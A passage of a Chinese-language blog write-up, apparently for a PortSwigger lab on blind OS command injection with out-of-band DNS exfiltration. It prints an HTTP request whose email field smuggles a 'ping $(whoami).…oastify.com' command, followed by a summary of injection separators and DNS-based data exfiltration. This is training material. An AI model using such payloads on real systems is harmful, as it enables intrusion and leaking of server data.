+<p><img src="/images/burp-collaborator-dns-log.png" alt="Burp Collaborator DNS 解析日志"></p>
+<h3 id="2-5-Blind-OS-command-injection-with-out-of-band-data-exfiltration"><a href="#2-5-Blind-OS-command-injection-with-out-of-band-data-exfiltration" class="headerlink" title="2.5 Blind OS command injection with out-of-band data exfiltration"></a>2.5 Blind OS command injection with out-of-band data exfiltration</h3><blockquote>
+<p>This lab contains a blind OS command injection vulnerability in the feedback function.</p>
+<p>The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application’s response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.</p>
+<p>To solve the lab, execute the <code>whoami</code> command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.</p>
+</blockquote>
+<p>在上一题的基础上增加了一点难度，不仅仅要触发 DNS 查询，还要携带 <code>whoami</code> 的输出。网上找了下，可以通过子域名的形式携带数据。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/feedback/submit</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0aeb00c604ebf6b7814361ed00aa00ed.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=PsXwTpAQTtcmERBtVDSEoCJ64RGkstlc</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>150</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;105&quot;, &quot;Not)A;Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0aeb00c604ebf6b7814361ed00aa00ed.web-security-academy.net</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0aeb00c604ebf6b7814361ed00aa00ed.web-security-academy.net/feedback</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">csrf</span>=<span class="number">7</span>Ry8gMMe46FqvD9HJHRqCpswXSz69Bti&amp;name=<span class="number">1</span>&amp;email=<span class="number">2</span>%<span class="number">40</span>gmail.com;ping+-c+<span class="number">4</span>+$(whoami).vwvk7vf1wdbva4fzqi26fvxkvb12psdh.oastify.com;&amp;subject=<span class="number">3</span>&amp;message=<span class="number">4</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><ul>
+<li>注入可以使用反引号、分号、管道、<code>&amp;&amp;</code>、<code>||</code> 等，注入时有可能命令末尾还需要加上注入字符，比如 <code>;payload;</code></li>
+<li>盲注可以使用 <code>sleep</code>、<code>ping</code> 等延时</li>
+<li>在 URL 编码中，空格 <code> </code> 不仅可以使用 <code>%20</code> 编码，还可以使用 <code>+</code> 编码</li>
+<li>Burp Collaborator 在盲注中的使用<ul>
+<li>DNS 解析，判断盲注状态</li>
+<li>DNS 解析，通过子域名携带数据</li>
+</ul>
+</li>
+<li>DNS 解析可以使用 <code>ping</code>、<code>nslookup</code> 等命令</li>
+</ul>
+<h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#os-command-injection">https://portswigger.net/web-security/all-labs#os-command-injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/collaborator">https://portswigger.net/burp/documentation/collaborator</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Burp/" rel="tag"># Burp</a>
+              <a href="/tags/Command-Injection/" rel="tag"># Command Injection</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/01/01/burp-suite-pro/" rel="prev" title="Burp Suite Pro">
+                  <i class="fa fa-angle-left"></i> Burp Suite Pro
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
